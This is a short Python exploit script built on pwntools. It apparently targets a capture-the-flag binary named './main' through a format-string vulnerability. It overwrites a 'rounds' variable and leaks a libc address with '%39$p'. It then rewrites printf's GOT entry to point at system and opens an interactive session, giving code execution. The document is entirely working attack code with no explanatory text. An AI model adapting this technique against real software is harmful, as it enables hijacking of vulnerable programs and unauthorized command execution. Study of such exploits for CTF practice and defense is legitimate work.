from pwn import *
context.arch = "amd64"
p = process("./main")
elf = ELF("./main", checksec = 0)
libc = elf.libc
#you need to rerun the exploit a few times !!
offset = 6

stage1_payload = fmtstr_payload(offset, {elf.sym.rounds : 0x1337}, write_size = "byte")

p.sendlineafter(b">>> ", stage1_payload)

p.sendlineafter(b">>> ", b"%39$p")
libc.address = int(p.recv(14), 16) - 0x2718a #libc.sym.__libc_start_call_main  + 122
print(hex(libc.address))

stage2_payload = fmtstr_payload(offset, {elf.got.printf : libc.sym.system}, write_size = "short")
p.sendlineafter(b">>> ", stage2_payload)

p.interactive()
